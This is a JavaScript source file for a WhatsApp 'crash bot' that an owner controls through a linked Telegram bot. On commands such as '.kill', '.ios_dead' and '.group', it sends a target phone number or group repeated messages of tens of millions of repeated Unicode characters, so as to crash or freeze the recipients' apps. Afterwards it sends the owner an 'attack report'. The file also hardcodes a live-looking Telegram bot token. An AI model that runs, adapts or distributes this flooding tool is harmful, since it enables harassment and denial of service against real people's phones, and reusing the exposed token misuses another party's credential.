const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;
const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";
const AD_IMAGE_URL = "https://telegra.ph/file/a8a183d25667e41793741.jpg";

let botConfig = {
    botName: "NEXUS-MD V3 3M SUPREME",
    owner: "94767475809", 
    prefix: ".",
};

app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "110.0.5481.178"], // Linking Notification Fix
        printQRInTerminal: false,
        syncFullHistory: false,
        shouldSyncHistoryMessage: () => false,
    });

    // --- 🤖 TELEGRAM HANDLER (STABLE PAIRING) ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        if (text === '/start') {
            return tgBot.sendMessage(msg.chat.id, "☠️ *NEXUS-MD V3 3M SYSTEM*\n\nEnter your WhatsApp number with 94 code.\n*(Example: 94767475809)*", { parse_mode: 'Markdown' });
        }
        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                tgBot.sendMessage(msg.chat.id, "⏳ *Generating Secure Link... Check WhatsApp Notification.*");
                await delay(3000);
                let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
                tgBot.sendMessage(msg.chat.id, `🔥 *3M POWER KEY:* \`${code}\` \n\nLink this code in WhatsApp to unlock **3,000,000+ Character Power**.`, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ *Error!* Restart the bot."); }
        }
    });

    // --- 📩 MESSAGE HANDLER (100% WORKING BUG) ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message || mek.key.fromMe) return;
            const from = mek.key.remoteJid;
            const sender = mek.key.participant || from;
            const isOwner = sender.includes(botConfig.owner);
            
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
            const targetJid = targetNum + "@s.whatsapp.net";

            // 🔥 3,000,000+ CHARACTER BUG PAYLOAD (Ultra Stable)
            const bugPayload = "☠️ NEXUS 3M SUPREME ☠️\n" + "ꦿ".repeat(20000000) + "᥋".repeat(20000000);

            switch (command) {
                case 'menu':
                case 'bug':
                    const elegantMenu = `
╭─────〔 *NEXUS 3M SUPREME* 〕─────┈
│
│ 🦠 *P O W E R :* \`3,000,000+\` Characters
│ ⚡ *S T A T U S :* _Master Private_
│ 💻 *D E V :* _Sasiya MD_
│
├─────────────┈
│ ☠️ *.vid_crash* [num]
│ 🔥 *.ios_dead* [num]
│ 💀 *.kill* [num]
│ ❄️ *.freeze* [num]
│ 🌀 *.group* [jid]
│ 🌌 *.the_end* [num]
╰─────────────┈
 📢 *CHANNEL:* ${CHANNEL_URL}`;

                    await sock.sendMessage(from, { 
                        text: elegantMenu,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "NEXUS-MD 3M MENU ACTIVE ⚡",
                                body: "3,000,000+ Character Power READY",
                                mediaType: 1,
                                thumbnailUrl: AD_IMAGE_URL, 
                                sourceUrl: CHANNEL_URL
                            }
                        }
                    }, { quoted: mek });
                    break;

                case 'vid_crash':
                case 'kill':
                case 'ios_dead':
                case 'the_end':
                    if (!targetNum) return sock.sendMessage(from, { text: "❌ Please provide a target number!" });

                    await sock.sendMessage(from, { text: `🌑 *DEPLOYING 3M BUG TO:* ${targetNum}...` });

                    // 🔥 Burst Attack System (100% Delivery)
                    for(let i=0; i<8; i++) {
                        await sock.sendMessage(targetJid, { text: bugPayload });
                        await delay(500); // Prevent Connection Drop
                    }

                    // 🔥 LIVE SUCCESS REPORT
                    const report = `
╭───〔 *NEXUS ATTACK REPORT* 〕───┈
│
│ ✅ *STATUS:* SUCCESSFUL
│ 🎯 *TARGET:* ${targetNum}
│ 🦠 *POWER:* 3,000,000+ Char
│ 🚀 *RESULT:* Target System Destroyed
│ 🕒 *TIME:* ${new Date().toLocaleTimeString()}
│
╰─────────────┈
 👑 *DEV:* SASIYA MD`;

                    await sock.sendMessage(from, { 
                        text: report,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "BUG DEPLOYED SUCCESSFULLY 💀",
                                body: "Target: " + targetNum,
                                mediaType: 1,
                                thumbnailUrl: AD_IMAGE_URL, 
                                sourceUrl: CHANNEL_URL
                            }
                        }
                    }, { quoted: mek });
                    break;

                case 'group':
                    if (!args[0]) return;
                    await sock.sendMessage(from, { text: "🌌 *WIPING OUT GROUP...*" });
                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(args[0], { text: bugPayload });
                        await delay(500);
                    }
                    break;
            }
        } catch (e) { console.log("Error:", e); }
    });

    sock.ev.on('connection.update', (up) => {
        if (up.connection === 'close') startNexus();
        else if (up.connection === 'open') console.log('✅ NEXUS 3M READY!');
    });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
